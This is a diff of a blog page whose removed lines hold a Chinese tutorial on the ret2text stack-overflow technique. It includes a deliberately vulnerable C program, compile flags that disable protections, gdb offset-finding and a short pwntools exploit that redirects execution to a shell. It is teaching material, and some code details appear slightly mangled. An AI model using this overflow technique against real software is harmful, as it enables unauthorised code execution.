-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令，而未来几篇文章分别介绍采取上述不同的方法完成不同场景的ROP。</p>
-<h2 id="ret2text原理"><a href="#ret2text原理" class="headerlink" title="ret2text原理"></a>ret2text原理</h2><p>先从ROP中最易于理解的ret2text讲起，ret2text顾名思义，即控制返回地址指向程序本身已有的的代码(.text)并执行。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>我们手动码一个带栈溢出问题的程序，这个程序有两个子函数func和sys，func中gets位置存在栈溢出，而sys函数未被任何函数调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//ret2text.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int sys()&#123;</span><br><span class="line">	system(&quot;/bin/shn&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int func()&#123;</span><br><span class="line">	char a[10];</span><br><span class="line">	gets(a);</span><br><span class="line">	puts(a);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>为了方便学习分析，这次先不加入canary机制和地址随机化问题的干扰，这些机制的绕过方式放在后面统一归纳总结。所以在gcc编译过程中加入参数使其关闭这两个保护机制，并打开-g调试选项，使用如下方式进行编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -no-pie -o ret2text64 ret2text.c</span><br></pre></td></tr></table></figure></p>
-<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>首先我们将程序gdb中，使用checksec查看一下安全机制（虽然这个题目的安全机制我们已经提前知道）</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text01.png" alt=""></p>
-<p>我们分析一下这个程序，从ret2text的原理来看，我们需要覆盖通过func函数中的局部变量a的溢出，覆盖func函数的返回地址，将其引导到sys函数的地址就可以获取shell。</p>
-<p>所以我们需要的信息有以下几点：<br>1.局部变量a的地址<br>2.func函数的返回地址<br>3.sys函数的地址</p>
-<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息<br>1.先查看代码，在第6行下个断点调试。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text02.png" alt=""></p>
-<p>2.运行程序到func内，并打印局部变量a的地址，sys函数的地址，以及此时rbp的地址。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text03.png" alt=""></p>
-<p>此时找到变量a的地址是0xffe2b6，rbp的地址是0xffe2c0，sys函数的地址是0x401142。</p>
-<p>我们需要的三个信息已经得到两个，最后剩下的func函数返回地址，在64位程序中，在rbp之后8个字节，所以返回地址是rbp+8=0xffe2c8。</p>
-<p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们要填充局部变量a直到返回地址，然后再将后面八个字节的位置填充为sys函数的地址0x401142。</p>
-<p>而这个偏移长度就是返回地址减去局部变量地址，得到0x12=18</p>
-<p>所以payload可以通过pwntools构造为</p>
-<p>payload = “A”*18+p64(0x401142)</p>
-<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2text64&quot;)</span><br><span class="line">payload = &quot;A&quot;*18 + p64(0x401142)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure></p>
-<p>执行exp即可获取shell</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2text04.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2295,7 +2305,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">106</span>
+                <span class="site-state-item-count">108</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
